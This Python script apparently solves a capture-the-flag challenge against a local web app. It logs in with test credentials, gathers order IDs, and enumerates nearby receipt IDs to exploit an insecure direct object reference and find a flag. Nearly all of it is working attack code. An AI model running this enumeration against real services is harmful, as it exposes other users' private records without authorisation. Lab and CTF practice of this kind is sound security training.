import requests
import re

base_url = 'http://127.0.0.1:32929'

session = requests.Session()

# Step 1 of login: fetch login page or initial token
try:
    r1 = session.get(f'{base_url}/login')
    print(f'GET /login status: {r1.status_code}')
    print(r1.text)
except Exception as e:
    print(f'Error fetching /login: {e}')

# Attempt to extract any CSRF or hidden token
login_token = None
m = re.search(r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)["\']', r1.text) if 'r1' in locals() else None
if m:
    login_token = m.group(1)
    print(f'Found csrf_token: {login_token}')

# Step 2 of login: submit credentials test:test following typical 2-step flow
login_data = {
    'username': 'test',
    'password': 'test'
}
if login_token is not None:
    login_data['csrf_token'] = login_token

try:
    r2 = session.post(f'{base_url}/login', data=login_data, allow_redirects=True)
    print(f'POST /login status: {r2.status_code}')
    print(r2.text)
    print(f'Session cookies after login: {session.cookies.get_dict()}')
except Exception as e:
    print(f'Error posting to /login: {e}')

# Now request /orders with authenticated session
try:
    r_orders = session.get(f'{base_url}/orders')
    print(f'GET /orders status: {r_orders.status_code}')
    print(r_orders.text)
except Exception as e:
    print(f'Error fetching /orders: {e}')
    r_orders = None

order_ids = set()
if r_orders is not None and r_orders.status_code == 200:
    # Find attributes like data-order-id="123" or data-order-id='123'
    for match in re.finditer(r'data-order-id=["\'](\d+)["\']', r_orders.text):
        oid = int(match.group(1))
        order_ids.add(oid)

print(f'Extracted order IDs: {sorted(order_ids)}')

# Build list of IDs to test: fuzz around each discovered ID plus fixed 1..15
ids_to_test = set()
for oid in order_ids:
    for delta in range(-5, 6):
        candidate = oid + delta
        if candidate > 0:
            ids_to_test.add(candidate)

for fixed in range(1, 16):
    ids_to_test.add(fixed)

ids_to_test = sorted(ids_to_test)
print(f'Total unique IDs to test: {len(ids_to_test)}')

results = []

for test_id in ids_to_test:
    url = f'{base_url}/order/{test_id}/receipt'
    try:
        resp = session.get(url)
        body = resp.text
        flag_found = ('FLAG{' in body)
        results.append((test_id, resp.status_code, flag_found))
        if flag_found:
            print(f'FLAG FOUND for id {test_id} with status {resp.status_code}')
            print(body)
    except Exception as e:
        print(f'Error fetching {url}: {e}')
        results.append((test_id, None, False))

# Print concise summary table
print('id,status,flag_found')
for tid, status, flag_found in results:
    print(f'{tid},{status},{flag_found}')

